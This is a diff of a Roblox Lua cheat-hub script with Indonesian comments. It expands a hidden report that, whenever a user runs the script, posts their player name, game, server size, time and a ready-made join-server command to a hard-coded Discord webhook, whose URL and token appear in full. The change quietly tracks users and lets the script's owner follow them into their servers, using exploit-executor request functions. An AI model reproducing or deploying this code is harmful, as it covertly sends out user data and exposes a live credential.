@@ -1,28 +1,61 @@
--- Updated
-
 local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
 local webhookURL = "https://discord.com/api/webhooks/1284396701049946112/B6vo2CkkWxnO7pcm2pa9jPa6dbCft1VEIEiNHtPXf9y6pqNZEt4jrcOXZNDZgCyddnTw"
 
-local playerName = game:GetService("Players").LocalPlayer.Name
+-- Mendapatkan informasi dari pemain lokal
+local player = game:GetService("Players").LocalPlayer
+local playerName = player.Name
+local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local placeId = game.PlaceId
+local maxPlayers = game:GetService("Players").MaxPlayers
+local activePlayers = #game:GetService("Players"):GetPlayers()
+local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
 
+-- Mendapatkan waktu lokal
+local localTime = os.date("%X")
+
+-- Membuat konten JSON untuk Discord dengan dua embed
 local data = {
-    ["content"] = "",
-    ["embeds"] = {{
-        ["description"] = playerName .. " akan menyadari bahwa Esp Owner Hub Nevan Akan Muncul Jika Owner dari Script masuk kedalam Gamenya",
-        ["title"] = "**ESP OWNER TELAH AKTIF**"
-    }}
+    ["embeds"] = {
+        {
+            ["title"] = "Pemain Baru!",
+            ["description"] = "**Nama Pemain:** " .. playerName .. 
+                              "\n\n**Nama Map:** " .. placeName .. 
+                              "\n**ID Map:** " .. placeId .. 
+                              "\n\n**Info Server:**\nJumlah Pemain Aktif: " .. activePlayers .. "/" .. maxPlayers,
+            ["color"] = 5814783,
+            ["fields"] = {
+                {
+                    ["name"] = "Script Join Server",
+                    ["value"] = "```lua\n" .. joinScript .. "\n```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Salin Script Join Server Untuk HP",
+                    ["value"] = joinScript,
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Waktu: " .. localTime
+            }
+        },
+        {
+            ["title"] = "**ESP OWNER TELAH AKTIF**",
+            ["description"] = playerName .. " akan menyadari bahwa Esp Owner Hub Nevan Akan Muncul Jika Owner dari Script masuk kedalam Gamenya"
+        }
+    }
 }
 
 local jsonData = game:GetService("HttpService"):JSONEncode(data)
 
-http_request {
+http_request({
     Url = webhookURL,
     Method = "POST",
     Headers = {
         ["Content-Type"] = "application/json"
     },
     Body = jsonData
-}
+})
 
 local players = game:GetService("Players")
 local localPlayer = players.LocalPlayer
